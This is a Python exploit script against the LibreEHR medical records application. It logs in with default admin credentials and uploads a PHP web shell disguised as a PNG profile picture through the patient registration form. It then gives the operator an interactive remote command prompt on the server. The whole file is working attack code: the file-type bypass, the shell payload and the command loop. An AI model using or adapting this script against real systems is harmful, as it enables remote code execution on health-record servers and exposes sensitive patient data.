import requests, sys, re
from colorama import Fore, Back, Style

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

C = [Style.RESET_ALL, Fore.RESET, Style.BRIGHT, Fore.BLUE, Fore.RED, Fore.GREEN, Fore.YELLOW]
info = C[2]+C[3]+'['+C[0]+C[2]+'-'+C[2]+C[3]+']'+C[0]+' '
err  = C[2]+C[4]+'['+C[0]+C[2]+'!'+C[2]+C[4]+']'+C[0]+' '
ok   = C[2]+C[5]+'['+C[0]+C[2]+'+'+C[2]+C[5]+']'+C[0]+' '

def webshell(SERVER_URL, WEBSHELL_FILE, session):
    try:
        WEB_SHELL = SERVER_URL+'sites/default/profile_pictures/'+WEBSHELL_FILE
        print WEB_SHELL
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.post(url=WEB_SHELL, data=getdir, verify=False, proxies=proxies)
        status = r2.status_code
        if status != 200:
            print(err+"Could not connect to the webshell.")
            r2.raise_for_status()
        print(ok+'Successfully connected to webshell.')
        print r2.text
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        print cwd
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        print(C[4]+')'+C[3]+'+++++'+C[4]+'['+C[1]+'=========>'+'     WELCOME BOKU     '+'<========'+C[4]+']'+C[3]+'+++++'+C[4]+'('+C[1])
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print('\r\n'+err+'Webshell session failed. Quitting.')
        quit()


if __name__ == "__main__":
#1 | INIT
    SERVER_URL = 'http://172.16.65.130/LibreEHR/'
    if not re.match(r".*/$", SERVER_URL):
        SERVER_URL = SERVER_URL+'/'
    LOGIN_URL  = SERVER_URL+'interface/login/login.php'
    LOGIN_POST = SERVER_URL+'interface/main/main_screen.php?auth=login&site=default'
    UPLOAD_URL = SERVER_URL+'interface/new/new_comprehensive_save.php'
#2 | Create Session
    s = requests.Session()
    get_session = s.get(LOGIN_URL, verify=False, proxies=proxies)
    if get_session.status_code == 200:
        print(ok+'Successfully connected to server and created session.')
        print(info+get_session.headers['Set-Cookie'])
    else:
        print(err+'Cannot connect to the server and create a web session.')
    login_data = {'new_login_session_management':'1', 'authProvider':'Default','authUser':'admin','clearPass':'admin','languageChoice':'1'}
    auth = s.post(url=LOGIN_POST, data=login_data, verify=False, proxies=proxies)
#3 | File Upload
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'profile_picture': 
                  (
                    'kaio-ken.php', 
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_REQUEST["telepathy"]); ?>', 
                    'image/png', 
                    {'Content-Disposition': 'form-data'}
                  ) 
              }
    fdata   = {'form_cb_1':'upload','form_fname':'Sun','form_mname':'','form_lname':'Wukong','form_sex':'Male','form_status':'','form_facility':''}
    upload_avatar = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
#4 | Get Webshell Upload Name
    avatarFile = str(re.findall(r'demographics\.php\?set_pid=\d*\&', upload_avatar.text))
    avatarFile = re.sub('^.*demographics\.php\?set_pid=', '', avatarFile)
    avatarFile = re.sub('&.*$', '', avatarFile)
    avatarFile = avatarFile+'.php'
    print avatarFile
    webshell(SERVER_URL, avatarFile, s) 
